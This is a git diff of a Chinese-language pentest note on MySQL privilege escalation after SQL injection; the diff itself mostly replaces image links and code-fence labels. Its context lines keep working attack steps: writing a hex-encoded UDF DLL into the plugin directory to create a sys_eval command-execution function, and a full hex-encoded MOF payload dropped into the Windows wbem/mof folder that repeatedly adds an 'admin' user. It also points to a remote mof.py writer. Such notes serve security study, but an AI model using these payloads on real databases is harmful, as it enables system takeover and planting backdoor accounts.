@@ -89,7 +89,7 @@ UDF是数据库允许用户自定义函数的一种功能，自定义后的函�
 - **udf库文件位置（** **`sqlmap目录/data/udf/mysql`** **）**
     
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=YzhmNjdlYTJlODhiNTc5NWU1ZTRhZWNjZGJmOGU5NzFfWkw1MGhYa2NiZ1o1Zlk5UndiRmt4WlFGZU5ia2lpQ0lfVG9rZW46VFVZMWI4dWlsb1BlajB4V1FhcGNqVHJHbmRhXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![](assets/SQL注入提权/file-20251215202503009.png)
 
 不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：`/extra/cloak/cloak.py` ，解码方法如下：
 
@@ -151,7 +151,7 @@ select @@basedir;
 SELECT hex(load_file('D:\\My_download\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin\\lib_mysqludf_sys_64.dll')) into dumpfile 'D:/udf.txt';
 ```
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTIxODk4OGUxOTkxMjQzM2VlOTFkMTZkMzI1YTE3MDBfN3hiNDdQaTAxNWN0MjQzUWRud3RnUUR4eXduc3RHdWhfVG9rZW46T3Z3T2Jqd2pkb0VVWHZ4cGtCNWNCZ21Kbk5nXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![](assets/SQL注入提权/file-20251215202512115.png)
 
 生成了文件，可以看一下，都是16进制编码。
 
@@ -162,7 +162,7 @@ SELECT 0x7f454c4602... INTO DUMPFILE 'D:\\My_download\\phpstudy_pro\\Extensions\
 .26\\lib\\plugin\\UDF.dll"\';
 ```
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmM3NGY3NzkwNTBjZGNkMDI3M2FlOTJmNTQzZDJkYzVfNkVBSDJ3Q1drTEQzcFFxeWROc0lhbWpXUUMxZDQ4Q0RfVG9rZW46VldtY2JtUUcwb1FsMmh4S09sUWM4OXdQbm9oXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![](assets/SQL注入提权/file-20251215202516793.png)
 
 这里已经成功写入了。
 
@@ -172,7 +172,7 @@ SELECT 0x7f454c4602... INTO DUMPFILE 'D:\\My_download\\phpstudy_pro\\Extensions\
 
 然后根据udf文件创建函数就好了，这里创建的函数不能自己随意创建，因为这个udf文件不是我们自己写的
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmVhZDcxNDAxMmRjNjY0ODFlZjMyNTY3NThjYzI2ZDVfQW5vTDNZT1oxR1RxelBUS05tcno4bWxnRFdIOGs5S0VfVG9rZW46RUVWR2J1NHVOb0t1dzd4Y2dvTmN2YXk3bmVjXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![](assets/SQL注入提权/file-20251215202521487.png)
 
 我们先看一下有没有函数，
 
@@ -180,7 +180,7 @@ SELECT 0x7f454c4602... INTO DUMPFILE 'D:\\My_download\\phpstudy_pro\\Extensions\
 select * from mysql.func;
 ```
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzk5ODIxNGYwMDdlNTJjODJmNGQ0MTAxMGQ3ZDUzMzJfazVNVUVaVXZkNWM5VDFqV3prQk1NMXJyMDJJU1IxNFJfVG9rZW46RUdYT2IzV0t3b1pyOXJ4WnRFaGM5RWRrbmtkXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![](assets/SQL注入提权/file-20251215202525752.png)
 
 现在是没有的。我们执行：
 
@@ -190,11 +190,11 @@ create function sys_eval returns string soname 'udf.dll';
 
 再查看一下
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjlmZGFiMzJhMmQyMWVlMGYzZTM3YTk2MTIwZmFmYjZfS0daWldlS3JENVd3aDA4ZlZqVVNrQXJESjV1OGswYXlfVG9rZW46T2V4UmJXQnIwb0VkQTF4VmVRdGNDYlY1bnFiXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![600](assets/SQL注入提权/file-20251215202529774.png)
 
 成功写入函数。现在已经提权成功。像使用version()函数一样就好了
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDNmMWJiMzMyMzZjODQxODM4ZDY3YmE4YjkxZGMwNDNfaEVpUDVYWlFpS1Zob2xiOGo4ZnJiSVIzdThTdEMyQmtfVG9rZW46UTNqNWI5RnpLb1FtTlp4ZGdsVmMxWjZqbmFlXzE3NjU4MDA5ODU6MTc2NTgwNDU4NV9WNA)
+![500](assets/SQL注入提权/file-20251215202533791.png)
 
 **删除函数**
 
@@ -223,14 +223,14 @@ MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环�
 - **into dumpfile直接写入hex编码的mof文件（等待稍长时间）。**
     
 
-```SQL
+```sql
 select 0x23707261676d61206e616d65737061636528225c5c5c5c2e5c5c726f6f745c5c737562736372697074696f6e2229200a696e7374616e6365206f66205f5f4576656e7446696c74657220617320244576656e7446696c746572200a7b200a202020204576656e744e616d657370616365203d2022526f6f745c5c43696d7632223b200a202020204e616d6520203d202266696c745032223b200a202020205175657279203d202253656c656374202a2046726f6d205f5f496e7374616e63654d6f64696669636174696f6e4576656e742022200a20202020202020202020202022576865726520546172676574496e7374616e636520497361205c2257696e33325f4c6f63616c54696d655c222022200a20202020202020202020202022416e6420546172676574496e7374616e63652e5365636f6e64203d2035223b200a2020202051756572794c616e6775616765203d202257514c223b200a7d3b200a0a696e7374616e6365206f66204163746976655363726970744576656e74436f6e73756d65722061732024436f6e73756d6572200a7b200a202020204e616d65203d2022636f6e735043535632223b200a20202020536372697074696e67456e67696e65203d20224a536372697074223b200a2020202053637269707454657874203d200a202020202276617220575348203d206e657720416374697665584f626a656374285c22575363726970742e5368656c6c5c22295c6e5753482e72756e285c226e65742e65786520757365722061646d696e2061646d696e202f6164645c2229223b200a7d3b200a0a696e7374616e6365206f66205f5f46696c746572546f436f6e73756d657242696e64696e67200a7b200a20202020436f6e73756d65722020203d2024436f6e73756d65723b200a2020202046696c746572203d20244576656e7446696c7465723b200a7d3b into dumpfile 'C:/windows/system32/wbem/mof/nullevt.mof';
 ```
 
 - **mof 文件：**
     
 
-```SQL
+```mof
 #pragma namespace("\\\\.\\root\\subscription") 
 instance of __EventFilter as $EventFilter 
 { 
@@ -258,7 +258,8 @@ instance of __FilterToConsumerBinding
 - **数据库允许远程链接的情况下使用mof.py写入:**
     
 
-```SQL
+```python
+# mof.py
 #Python3
 
 import MySQLdb
@@ -330,7 +331,7 @@ conn.close()
 
 这里用国光师傅的docker环境
 
-```Bash
+```bash
 # 拉取镜像
 docker pull sqlsec/cve-2016-6663
 
